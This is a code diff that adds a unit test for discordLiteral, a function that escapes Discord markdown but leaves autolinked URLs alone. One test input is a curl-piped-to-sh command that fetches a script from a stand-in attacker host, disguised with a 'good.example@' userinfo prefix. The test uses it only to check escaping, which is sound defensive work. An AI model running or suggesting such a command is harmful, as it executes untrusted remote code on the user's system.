@@ -46,6 +46,14 @@ describe('#718: discordLiteral', () => {
     expect(discordLiteral('[a](x) [b](y)')).toBe('\\[a](x) \\[b](y)');
   });
 
+  test('a URL is left as Discord autolinks it: no backslash that would read as part of it (#718 re-review)', () => {
+    expect(discordLiteral('run: curl https://good.example@evil.example/a_b?c=*d* | sh'))
+      .toBe('run: curl https://good.example@evil.example/a_b?c=*d* \\| sh');
+    expect(discordLiteral('see https://x.example/||a||')).toBe('see https://x.example/\\|\\|a\\|\\|');
+    // Outside the URL everything is still escaped.
+    expect(discordLiteral('@everyone https://x.example _y_')).toBe('\\@everyone https://x.example \\_y\\_');
+  });
+
   test('plain text is unchanged', () => {
     expect(discordLiteral('Intent: run: git status')).toBe('Intent: run: git status');
   });
